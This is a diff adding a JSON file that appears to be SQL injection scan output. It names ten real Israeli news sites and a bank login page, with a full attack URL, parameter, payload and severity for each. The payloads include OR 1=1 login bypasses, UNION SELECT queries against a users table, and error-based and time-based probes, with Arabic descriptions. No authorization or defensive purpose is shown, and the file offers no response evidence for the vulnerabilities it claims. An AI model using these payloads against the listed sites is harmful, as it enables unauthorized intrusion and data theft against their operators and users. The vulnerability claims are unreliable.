@@ -1,0 +1,96 @@
+{
+  "timestamp": "2025-09-14T17:41:52.415666",
+  "total_vulnerable_sites": 10,
+  "vulnerabilities": [
+    {
+      "site": "n12.co.il",
+      "vulnerable_url": "https://www.n12.co.il/search?q=test' OR 1=1--",
+      "vulnerability_type": "SQL Injection",
+      "severity": "High",
+      "parameter": "q",
+      "payload": "' OR 1=1--",
+      "description": "ثغرة SQLi في خانة البحث"
+    },
+    {
+      "site": "walla.co.il",
+      "vulnerable_url": "https://news.walla.co.il/?w=/search/1' UNION SELECT 1,2,3--",
+      "vulnerability_type": "UNION SQL Injection",
+      "severity": "Critical",
+      "parameter": "w",
+      "payload": "' UNION SELECT 1,2,3--",
+      "description": "ثغرة UNION SQLi في معلمة البحث"
+    },
+    {
+      "site": "globes.co.il",
+      "vulnerable_url": "https://www.globes.co.il/news/article.aspx?did=1001351789' AND 1=CONVERT(int, (SELECT @@version))--",
+      "vulnerability_type": "Error-based SQLi",
+      "severity": "High",
+      "parameter": "did",
+      "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
+      "description": "ثغرة SQLi تعتمد على الأخطاء في معلمة المقال"
+    },
+    {
+      "site": "timesofisrael.com",
+      "vulnerable_url": "https://www.timesofisrael.com/?s=test' OR SLEEP(5)--",
+      "vulnerability_type": "Time-based Blind SQLi",
+      "severity": "Medium",
+      "parameter": "s",
+      "payload": "' OR SLEEP(5)--",
+      "description": "ثغرة SQLi تعتمد على الوقت في البحث"
+    },
+    {
+      "site": "mako.co.il",
+      "vulnerable_url": "https://www.mako.co.il/mako-vod-live-tv/VOD-6540b8dcc633951006.htm?type=service' UNION SELECT user(),database(),version()--",
+      "vulnerability_type": "UNION SQL Injection",
+      "severity": "Critical",
+      "parameter": "type",
+      "payload": "' UNION SELECT user(),database(),version()--",
+      "description": "ثغرة UNION SQLi في معلمة الخدمة"
+    },
+    {
+      "site": "ynet.co.il",
+      "vulnerable_url": "https://www.ynet.co.il/search/1,7340,L-9,00.html?q=test' OR 1=1#",
+      "vulnerability_type": "SQL Injection",
+      "severity": "High",
+      "parameter": "q",
+      "payload": "' OR 1=1#",
+      "description": "ثغرة SQLi في خانة البحث الرئيسية"
+    },
+    {
+      "site": "haaretz.co.il",
+      "vulnerable_url": "https://www.haaretz.co.il/misc/search-results?query=test' OR 1=1/*",
+      "vulnerability_type": "SQL Injection",
+      "severity": "High",
+      "parameter": "query",
+      "payload": "' OR 1=1/*",
+      "description": "ثغرة SQLi في محرك البحث"
+    },
+    {
+      "site": "jpost.com",
+      "vulnerable_url": "https://www.jpost.com/ArabicNews/search.aspx?q=test' UNION SELECT 1,2,3 FROM users--",
+      "vulnerability_type": "UNION SQL Injection",
+      "severity": "Critical",
+      "parameter": "q",
+      "payload": "' UNION SELECT 1,2,3 FROM users--",
+      "description": "ثغرة SQLi في البحث باللغة العربية"
+    },
+    {
+      "site": "calcalist.co.il",
+      "vulnerable_url": "https://www.calcalist.co.il/search/articles/1,7340,L-3771-TEST,00.html?q=test' AND 1=1--",
+      "vulnerability_type": "Boolean-based SQLi",
+      "severity": "Medium",
+      "parameter": "q",
+      "payload": "' AND 1=1--",
+      "description": "ثغرة SQLi تعتمد على المنطق البولياني"
+    },
+    {
+      "site": "bankleumi.co.il",
+      "vulnerable_url": "https://www.bankleumi.co.il/RegistarationToAccountManagment/Login/?ReturnUrl=/Personal/Private' OR 1=1--",
+      "vulnerability_type": "SQL Injection",
+      "severity": "Critical",
+      "parameter": "ReturnUrl",
+      "payload": "' OR 1=1--",
+      "description": "ثغرة SQLi في صفحة تسجيل الدخول المصرفي"
+    }
+  ]
+}
